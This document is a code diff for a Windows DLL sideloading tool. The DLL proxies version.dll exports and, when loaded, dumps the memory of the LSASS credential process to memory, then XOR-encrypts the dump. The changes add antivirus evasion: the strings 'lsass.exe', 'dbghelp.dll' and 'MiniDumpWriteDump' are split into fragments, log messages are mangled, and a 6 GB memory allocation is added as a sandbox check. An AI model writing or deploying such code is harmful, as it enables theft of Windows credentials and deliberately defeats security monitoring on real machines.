@@ -3,7 +3,6 @@
 #include <stdio.h>
 #include <TlHelp32.h>
 #include <DbgHelp.h>
-#pragma comment(lib, "Dbghelp.lib")
 
 #pragma comment(linker,"/export:GetFileVersionInfoA=C:\\Windows\\System32\\version.GetFileVersionInfoA,@1")
 #pragma comment(linker,"/export:GetFileVersionInfoByHandle=C:\\Windows\\System32\\version.GetFileVersionInfoByHandle,@2")
@@ -75,7 +74,7 @@ void XOR(char* data, int data_len, char* key, int key_len)
 	}
 }
 
-// Enable SeDebugPrivilige if not enabled already
+// Enable se__deb$ugPrivilige if not enabled already
 BOOL SetDebugPrivilege() {
 	HANDLE hToken = NULL;
 	TOKEN_PRIVILEGES TokenPrivileges = { 0 };
@@ -91,13 +90,13 @@ BOOL SetDebugPrivilege() {
 	char sPriv[] = { 'S','e','D','e','b','u','g','P','r','i','v','i','l','e','g','e',0 };
 	if (!LookupPrivilegeValueA(NULL, (LPCSTR)sPriv, &TokenPrivileges.Privileges[0].Luid)) {
 		CloseHandle(hToken);
-		printf("[-] No SeDebugPrivs. Make sure you are an admin\n");
+		printf("[-] No se__deb$ugPrivs. Make sure you are an admin\n");
 		return FALSE;
 	}
 
 	if (!AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
 		CloseHandle(hToken);
-		printf("[-] Could not adjust to SeDebugPrivs\n");
+		printf("[-] Could not adjust to se__deb$ugPrivs\n");
 		return FALSE;
 	}
 
@@ -130,41 +129,80 @@ int FindPID(const char* procname)
 
 int main(int argc, char** argv)
 {
-	// Find LSASS PID
-	printf("[+] Searching for LSASS PID\n");
-	int pid = FindPID("lsass.exe");
+	// Find ls__a_ss PID
+	printf("[+] Searching for ls__a_ss PID\n");
+	char l$a$$[MAX_PATH];
+	memset(l$a$$, 0, MAX_PATH);
+	char ls[] = "ls";
+	char as[] = "as";
+	char s_[] = "s.e";
+	char ex[] = "xe";
+
+	strcat(l$a$$, ls);
+	strcat(l$a$$, as);
+	strcat(l$a$$, s_);
+	strcat(l$a$$, ex);
+	int pid = FindPID(l$a$$);
 	if (pid == 0) {
-		printf("[-] Could not find LSASS PID\n");
-		return 0;
+		printf("[-] Could not find ls__a_ss PID\n");
+		return -1;
 	}
-	printf("[+] LSASS PID: %i\n", pid);
+	printf("[+] ls__a_ss PID: %i\n", pid);
 
-	// Make sure we have SeDebugPrivilege enabled
-	if (!SetDebugPrivilege())
-		return 0;
+	// Make sure we have se__deb$ugPrivilege enabled
+	if (!SetDebugPrivilege()) {
+		return -1;
+	}
 
-	// Open handle to LSASS
+	// Open handle to ls__a_ss
 	HANDLE hProc = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, false, pid);
 	if (hProc == NULL) {
-		printf("[-] Could not open handle to LSASS process\n");
-		return 0;
+		printf("[-] Could not open handle to ls__a_ss process\n");
+		return -1;
 	}
 
 	// Create a "MINIDUMP_CALLBACK_INFORMATION" structure that points to our DumpCallbackRoutine as a CallbackRoutine
 	MINIDUMP_CALLBACK_INFORMATION CallbackInfo = { 0 };
 	CallbackInfo.CallbackRoutine = DumpCallbackRoutine;
 
-	// Do full memory dump of lsass and use our CallbackRoutine to handle the dump data instead of writing it directly to disk
+	// Do full memory dump of ls__a_ss and use our CallbackRoutine to handle the dump data instead of writing it directly to disk
 	typedef BOOL (WINAPI *MyMiniDumpWriteDump)(HANDLE, DWORD, HANDLE, MINIDUMP_TYPE, PMINIDUMP_EXCEPTION_INFORMATION, PMINIDUMP_USER_STREAM_INFORMATION, PMINIDUMP_CALLBACK_INFORMATION);
-	MyMiniDumpWriteDump myMiniDumpWriteDump = (MyMiniDumpWriteDump)GetProcAddress(LoadLibrary("dbghelp.dll"), "MiniDumpWriteDump");
+
+	char dbg$$h$lp[MAX_PATH];
+	memset(dbg$$h$lp, 0, MAX_PATH);
+	char db[] = "db";
+	char gh[] = "ghel";
+	char pd[] = "p.d";
+	char ll[] = "ll";
+
+	strcat(dbg$$h$lp, db);
+	strcat(dbg$$h$lp, gh);
+	strcat(dbg$$h$lp, pd);
+	strcat(dbg$$h$lp, ll);
+
+	char mi$$ni$du$p[MAX_PATH];
+	memset(mi$$ni$du$p, 0, MAX_PATH);
+	char mi[] = "Min";
+	char iD[] = "iDum";
+	char pW[] = "pWri";
+	char tD[] = "teDu";
+	char mp[] = "mp";
+
+	strcat(mi$$ni$du$p, mi);
+	strcat(mi$$ni$du$p, iD);
+	strcat(mi$$ni$du$p, pW);
+	strcat(mi$$ni$du$p, tD);
+	strcat(mi$$ni$du$p, mp);
+
+	MyMiniDumpWriteDump myMiniDumpWriteDump = (MyMiniDumpWriteDump)GetProcAddress(LoadLibrary(dbg$$h$lp), mi$$ni$du$p);
 	BOOL success = myMiniDumpWriteDump(hProc, pid, NULL, MiniDumpWithFullMemory, NULL, NULL, &CallbackInfo);
 	if (success) {
-		printf("[+] Successfully dumped LSASS to memory!\n");
+		printf("[+] Successfully dumped ls__a_ss to memory!\n");
 		MessageBox(NULL, "OK", "OK", MB_OK);
 	}
 	else {
-		printf("[-] Could not dump LSASS to memory\n[-] Error Code: %i\n", GetLastError());
-		return 0;
+		printf("[-] Could not dump ls__a_ss to memory\n[-] Error Code: %i\n", GetLastError());
+		return -1;
 	}
 
 	// Xor encrypt our dump data in memory using the specified key
@@ -184,7 +222,15 @@ int main(int argc, char** argv)
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
 	if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
 		MessageBox(NULL, "Running", "Running", MB_OK);
-		main(0, {});
+		
+		char* mem = NULL;
+		mem = (char*)malloc(6442450944);
+		
+		if (mem != NULL) {
+			memset(mem, 00, 6442450944);
+			free(mem);
+			main(0, {});
+		}
 	}
 	return TRUE;
 }
